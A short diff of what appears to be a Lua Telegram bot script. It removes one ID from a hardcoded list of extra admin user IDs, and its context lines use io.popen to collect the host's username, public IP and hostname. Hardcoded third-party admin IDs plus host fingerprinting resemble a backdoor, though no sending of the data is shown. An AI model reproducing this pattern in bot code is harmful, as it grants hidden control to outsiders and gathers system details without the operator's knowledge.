@@ -11,7 +11,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,1858175861,1198482178,1329623702,1824990606,}
+List_Sudos = {Id_Sudo,1858175861,1198482178,1329623702,}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
